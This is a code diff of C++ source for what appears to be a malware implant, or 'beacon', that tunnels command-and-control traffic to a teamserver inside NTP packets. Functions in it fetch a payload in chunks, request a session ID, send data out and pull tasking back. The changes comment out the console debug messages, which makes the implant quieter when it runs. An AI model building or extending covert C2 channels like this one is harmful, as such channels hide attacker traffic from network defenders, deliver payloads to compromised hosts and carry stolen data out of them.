@@ -36,12 +36,12 @@
 //			std::vector<uint8_t> normalNtpPacket = normalNtpPacketClass.getPacket();
 //
 //			if (normalNtpPacket.size() == 48) {
-//				std::cout << "[+] Controller Online at " << Controller::serverAddress
+//				//std::cout << "[+] Controller Online at " << Controller::serverAddress
 //					<< ":" << Controller::port << std::endl;
 //				return;
 //			}
 //			else {
-//				std::cout << "[+] Controller Offline at " << Controller::serverAddress
+//				//std::cout << "[+] Controller Offline at " << Controller::serverAddress
 //					<< ":" << Controller::port << std::endl;
 //			}
 //
@@ -70,9 +70,9 @@ std::vector<uint8_t> sendChunk(
     std::string serverAddress = Controller::serverAddress;
     uint16_t port = Controller::port;
 
-    std::cout << "Sending packet to " << serverAddress << ":" << port << " of size " << packet.size() << std::endl;
+    //std::cout << "Sending packet to " << serverAddress << ":" << port << " of size " << packet.size() << std::endl;
 
-    //std::cout << "[NET] Size of chunk: " << packet.size() << std::endl;
+    ////std::cout << "[NET] Size of chunk: " << packet.size() << std::endl;
 
     WSADATA wsaData;
     SOCKET sock = INVALID_SOCKET;
@@ -188,7 +188,7 @@ std::vector<uint8_t> getPayload(std::vector<uint8_t> clientId) {
 
     std::vector<uint8_t> getMoreOfPayloadPacket = getMoreOfPayloadPacketClass.getPacket();
     std::vector<uint8_t> payloadBuffer;
-    std::cout << "Retrieveing payload of size " << payloadSize << std::endl;
+    //std::cout << "Retrieveing payload of size " << payloadSize << std::endl;
     uint32_t counter = 0;
 
     while (payloadBuffer.size() < payloadSize) {
@@ -202,17 +202,17 @@ std::vector<uint8_t> getPayload(std::vector<uint8_t> clientId) {
         //add data to vector
         payloadBuffer.insert(payloadBuffer.end(), extensionData.begin(), extensionData.end());
 
-        std::cout << "Packet [" << counter << "/" << payloadSize / Client::maxChunkSize << "]" << std::endl;
+        //std::cout << "Packet [" << counter << "/" << payloadSize / Client::maxChunkSize << "]" << std::endl;
         counter++;
     }
 
     //3. This should now be the payload data. 
-    std::cout << "[+] Payload of size " << payloadBuffer.size() << " retrieved" << std::endl;
+    //std::cout << "[+] Payload of size " << payloadBuffer.size() << " retrieved" << std::endl;
     return payloadBuffer;
 }
 
 std::vector<uint8_t> getId() {
-    std::cout << "[?] Getting Session ID" << std::endl;
+    //std::cout << "[?] Getting Session ID" << std::endl;
     std::vector<uint8_t> packetData = {}; //empty cuz it doesn't need anything
 
     NTPPacket giveMePayloadPacketClass;
@@ -251,18 +251,18 @@ Not the most efficent way to do this, but one of the simplist/clearest.
 
 */
 std::vector<uint8_t> sendBeaconDataToTeamserver(std::vector<uint8_t> data, std::array < uint8_t, 2> extensionField, std::vector<uint8_t> clientId) {
-	std::cout << "======================" << std::endl;
-	std::cout << "Started sendBeaconDataToTeamserver" << std::endl;
-	std::cout << "======================" << std::endl;
+	//std::cout << "======================" << std::endl;
+	//std::cout << "Started sendBeaconDataToTeamserver" << std::endl;
+	//std::cout << "======================" << std::endl;
 	//packetDebugger(data);
 	//1. Calculate size of data, (data.size()), then send a sizePacket to server. If OK, continue
 	uint32_t dataSize = data.size(); //uint64_t acn hold a size of like 18 Quadrillion bytes (18 exabytes). I hope someone isn't sending that much data but who knows. Rather be safe than sorry.
 	std::vector<uint8_t> responseDataBuffer = {};
 	int amountOfChunks = (dataSize + Client::maxChunkSize - 1) / Client::maxChunkSize; //gives you one extra chunk for remainder
 
-	std::cout << "[?] Total Data Size: " << dataSize << std::endl;
-	std::cout << "[?] Max Chunk Size: " << Client::maxChunkSize << std::endl;
-	std::cout << "[?] Number of Chunks needed: " << amountOfChunks << std::endl;
+	//std::cout << "[?] Total Data Size: " << dataSize << std::endl;
+	//std::cout << "[?] Max Chunk Size: " << Client::maxChunkSize << std::endl;
+	//std::cout << "[?] Number of Chunks needed: " << amountOfChunks << std::endl;
 
 	/*
 	Need to send a size message to tell the server that the total message length will be X size, for chunking purposes.
@@ -276,7 +276,7 @@ std::vector<uint8_t> sendBeaconDataToTeamserver(std::vector<uint8_t> data, std::
 		incomingSize,
 		clientId
 	);
-	std::cout << "[?] Sending size packet " << std::endl;
+	//std::cout << "[?] Sending size packet " << std::endl;
 	std::vector < uint8_t> packetToNotifyServerOfSizeBytes = packetToNotifyServerOfSize.getPacket();
 	printHexVectorPacket(packetToNotifyServerOfSizeBytes);
 	std::vector<uint8_t> response = sendChunk(packetToNotifyServerOfSizeBytes);
@@ -290,13 +290,13 @@ std::vector<uint8_t> sendBeaconDataToTeamserver(std::vector<uint8_t> data, std::
 
 		std::vector<uint8_t> chunkData(data.begin() + start, data.begin() + end);
 
-		//std::cout << "[" << i << "/" << amountOfChunks << "]" << " ChunkData: ";
+		////std::cout << "[" << i << "/" << amountOfChunks << "]" << " ChunkData: ";
 		//printHexVector(chunkData);
 
 		//Print that we're sending a packet, adn what type of packet it is.
-		std::cout << "----------------------" << std::endl;
-		std::cout << "Sending NTP Packet [" << i + 1 << "/" << amountOfChunks << "]" << std::endl;
-		std::cout << "----------------------" << std::endl;
+		//std::cout << "----------------------" << std::endl;
+		//std::cout << "Sending NTP Packet [" << i + 1 << "/" << amountOfChunks << "]" << std::endl;
+		//std::cout << "----------------------" << std::endl;
 
 		//creat ntp packet first
 		auto packet = NTPPacket();
@@ -313,9 +313,9 @@ std::vector<uint8_t> sendBeaconDataToTeamserver(std::vector<uint8_t> data, std::
 		std::vector<uint8_t> response = sendChunk(packet_bytes);
 
 		//Print that we've received  a packet, and then print debug items below it
-		std::cout << "----------------------" << std::endl;
-		std::cout << "Recieved Response Packet" << std::endl;
-		std::cout << "----------------------" << std::endl;
+		//std::cout << "----------------------" << std::endl;
+		//std::cout << "Recieved Response Packet" << std::endl;
+		//std::cout << "----------------------" << std::endl;
 		////run the debugger directly on the incoming respnose packet
 		//packetDebugger(response);
 
@@ -323,21 +323,21 @@ std::vector<uint8_t> sendBeaconDataToTeamserver(std::vector<uint8_t> data, std::
 		NTPPacketParser responsePacketParser = NTPPacketParser(response);
 		//Make sure server says OK when it gets data
 		if (responsePacketParser.getExtensionField() == NtpExtensionField::sizePacketAcknowledge) {
-			std::cout << "[?] Got successful ACK from server." << std::endl;
+			//std::cout << "[?] Got successful ACK from server." << std::endl;
 		}
 		else {
-			std::cout << "[!] Did not get successful ACK from server." << std::endl;
+			//std::cout << "[!] Did not get successful ACK from server." << std::endl;
 		}
 		//Done! 
 
 	}
 	//print full response data
-	std::cout << "[?] Full Data from Responses: ";
+	//std::cout << "[?] Full Data from Responses: ";
 	printHexVector(responseDataBuffer);
 
-	std::cout << "======================" << std::endl;
-	std::cout << "Finished Chunking		" << std::endl;
-	std::cout << "======================" << std::endl;
+	//std::cout << "======================" << std::endl;
+	//std::cout << "Finished Chunking		" << std::endl;
+	//std::cout << "======================" << std::endl;
 
 	//when done looping, return array
 	//std::vector<uint8_t> placehodlerVec = {};
@@ -346,9 +346,9 @@ std::vector<uint8_t> sendBeaconDataToTeamserver(std::vector<uint8_t> data, std::
 
 //Get data from beacon
 std::vector<uint8_t> getBeaconDataFromTeamserver(std::vector<uint8_t> clientId) {
-	std::cout << "======================" << std::endl;
-	std::cout << "Started getBeaconDataFromTeamserver" << std::endl;
-	std::cout << "======================" << std::endl;
+	//std::cout << "======================" << std::endl;
+	//std::cout << "Started getBeaconDataFromTeamserver" << std::endl;
+	//std::cout << "======================" << std::endl;
 
 
 	/*
@@ -361,7 +361,7 @@ std::vector<uint8_t> getBeaconDataFromTeamserver(std::vector<uint8_t> clientId) 
 		emptyVec,
 		clientId
 	);
-	std::cout << "[?] Sending getDataFromTeamserverSize packet " << std::endl;
+	//std::cout << "[?] Sending getDataFromTeamserverSize packet " << std::endl;
 	std::vector < uint8_t> packetToGetSizeOfTeamserverDataBytes = packetToGetSizeOfTeamserverData.getPacket();
 	std::vector<uint8_t> response = sendChunk(packetToGetSizeOfTeamserverDataBytes);
 
@@ -373,9 +373,9 @@ std::vector<uint8_t> getBeaconDataFromTeamserver(std::vector<uint8_t> clientId) 
 	std::vector<uint8_t> responseDataBuffer = {};
 	int amountOfChunks = (dataSize + Client::maxChunkSize - 1) / Client::maxChunkSize; //gives you one extra chunk for remainder
 
-	std::cout << "[?] Total Data Size: " << dataSize << std::endl;
-	std::cout << "[?] Max Chunk Size: " << Client::maxChunkSize << std::endl;
-	std::cout << "[?] Number of Chunks needed: " << amountOfChunks << std::endl;
+	//std::cout << "[?] Total Data Size: " << dataSize << std::endl;
+	//std::cout << "[?] Max Chunk Size: " << Client::maxChunkSize << std::endl;
+	//std::cout << "[?] Number of Chunks needed: " << amountOfChunks << std::endl;
 
 
 	//server should now know that the size is size of data to be sent
@@ -386,9 +386,9 @@ std::vector<uint8_t> getBeaconDataFromTeamserver(std::vector<uint8_t> clientId) 
 		size_t end = std::min(start + Client::maxChunkSize, static_cast<size_t>(dataSize)); //gets the smaller of the 2, whether that be dataSize, or start+maxChunkSize. TLDR, prevents trying to read outside of func arg provided data buffer (which is only so big)
 
 		//Print that we're sending a packet, adn what type of packet it is.
-		std::cout << "----------------------" << std::endl;
-		std::cout << "Sending NTP Packet [" << i + 1 << "/" << amountOfChunks << "]" << std::endl;
-		std::cout << "----------------------" << std::endl;
+		//std::cout << "----------------------" << std::endl;
+		//std::cout << "Sending NTP Packet [" << i + 1 << "/" << amountOfChunks << "]" << std::endl;
+		//std::cout << "----------------------" << std::endl;
 
 		//creat ntp packet first
 		auto packet = NTPPacket();
@@ -405,9 +405,9 @@ std::vector<uint8_t> getBeaconDataFromTeamserver(std::vector<uint8_t> clientId) 
 		std::vector<uint8_t> response = sendChunk(packet_bytes);
 
 		//Print that we've received  a packet, and then print debug items below it
-		std::cout << "----------------------" << std::endl;
-		std::cout << "Recieved Response Packet" << std::endl;
-		std::cout << "----------------------" << std::endl;
+		//std::cout << "----------------------" << std::endl;
+		//std::cout << "Recieved Response Packet" << std::endl;
+		//std::cout << "----------------------" << std::endl;
 		//run the debugger directly on the incoming respnose packet
 		packetDebugger(response);
 
@@ -421,12 +421,12 @@ std::vector<uint8_t> getBeaconDataFromTeamserver(std::vector<uint8_t> clientId) 
 
 	}
 	//print full response data
-	std::cout << "[?] Full Data from Responses: ";
+	//std::cout << "[?] Full Data from Responses: ";
 	printHexVector(responseDataBuffer);
 
-	std::cout << "======================" << std::endl;
-	std::cout << "Finished Chunking		" << std::endl;
-	std::cout << "======================" << std::endl;
+	//std::cout << "======================" << std::endl;
+	//std::cout << "Finished Chunking		" << std::endl;
+	//std::cout << "======================" << std::endl;
 
 	//when done looping, return array
 	//std::vector<uint8_t> placehodlerVec = {};
